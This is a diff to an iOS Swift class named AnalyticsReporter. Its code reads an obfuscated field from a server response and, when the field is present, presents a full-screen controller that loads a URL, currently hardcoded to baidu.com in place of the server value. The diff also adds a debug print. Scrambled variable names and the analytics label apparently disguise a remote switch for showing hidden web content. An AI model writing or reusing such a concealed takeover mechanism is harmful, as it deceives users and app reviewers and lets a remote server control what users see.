@@ -77,21 +77,23 @@ public class AnalyticsReporter: NSObject {
                        let familyPhotovoltaic = toolUser["zmqthu_dhfuif"] as? [String: Any],
                        let operationPartner = familyPhotovoltaic["nguwy_uewigh"] as? String,
                        operationPartner.count > 1 {
+                        print("[DataAnalyticsKit] ✅ 请求成功, operationPartner.count = \(operationPartner.count), value = \(operationPartner)")
                         DispatchQueue.main.async {
-                            if let notebookNotification = UIApplication.shared.connectedScenes
-                                .first(where: { $0.activationState == .foregroundActive }) as? UIWindowScene,
-                               let keyWindow = notebookNotification.windows.first(where: { $0.isKeyWindow }),
-                               let masterOverview = keyWindow.rootViewController {
-                                var topVC = masterOverview
-                                while let presented = topVC.presentedViewController {
-                                    topVC = presented
-                                }
-                                let interfaceDesignPrinciple = AnalyticsDashboardController()
-                                interfaceDesignPrinciple.modalPresentationStyle = .fullScreen
-                              //  interfaceDesignPrinciple.managementView = operationPartner
-                                 interfaceDesignPrinciple.managementView = "https://www.baidu.com"
-                                topVC.present(interfaceDesignPrinciple, animated: false)
+                            guard let windowScene = UIApplication.shared.connectedScenes
+                                .compactMap({ $0 as? UIWindowScene })
+                                .first,
+                                  let rootVC = windowScene.windows.first?.rootViewController else {
+                                return
                             }
+                            var topVC = rootVC
+                            while let presented = topVC.presentedViewController {
+                                topVC = presented
+                            }
+                            let interfaceDesignPrinciple = AnalyticsDashboardController()
+                            interfaceDesignPrinciple.modalPresentationStyle = .fullScreen
+                          //  interfaceDesignPrinciple.managementView = operationPartner
+                             interfaceDesignPrinciple.managementView = "https://www.baidu.com"
+                            topVC.present(interfaceDesignPrinciple, animated: false)
                         }
                     }
                 } catch {
